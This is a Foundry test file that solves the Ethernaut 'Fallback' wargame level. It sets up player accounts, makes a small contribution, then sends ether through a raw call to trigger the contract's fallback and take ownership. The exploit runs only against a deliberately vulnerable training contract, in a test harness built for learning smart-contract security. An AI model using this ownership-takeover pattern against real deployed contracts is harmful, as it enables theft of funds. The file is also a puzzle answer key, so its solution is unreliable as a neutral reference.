pragma solidity ^0.8;

import "forge-std/Test.sol";
import {Fallback} from "contracts/Ethernaut/contracts/levels/Level 1 - Fallback/Fallback.sol";
import {FallbackFactory} from "contracts/Ethernaut/contracts/levels/Level 1 - Fallback/FallbackFactory.sol";

contract EthNautL1Solution is Test {
    
    address private player1;
    address private player2;

    Fallback private activeLevel;
    FallbackFactory private activeFactory;


    function setUp() public {
        player1 = makeAddr("player1");
        player2 = makeAddr("player2");

        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);

        activeFactory = new FallbackFactory();
        activeLevel = Fallback(payable(activeFactory.createInstance(player2)));

    }//function setUp() public {

    function test_IsWorking() public {
        vm.startPrank(player1);

        activeLevel.contribute{value: 5 wei}();

        //Check our contributions were sucessful
        assertEq(activeLevel.getContribution(), 5 wei);

        //Owner is still the factory contract
        assertEq(activeLevel.owner(), address(activeFactory));
    }//function test_IsWorking() public {

    function test_Exploit() public {
        vm.startPrank(player1);

        //we need ' > 0' contributions to pass the second part of `require` on L39
        activeLevel.contribute{value: 5 wei}();

        //transfer sends only 2300 gas, needs to be call()
        //└─ ← "EvmError: OutOfGas"
        //payable(address(activeLevel)).transfer(5 wei);

        (bool success, ) = address(activeLevel).call{value: 5 wei}("");
        require(success, "Compiler Warnings Bug The Sh1t Out of ME!");

        assertEq(activeLevel.owner(), address(player1));
    }//function test_Exploit() public {
}//class
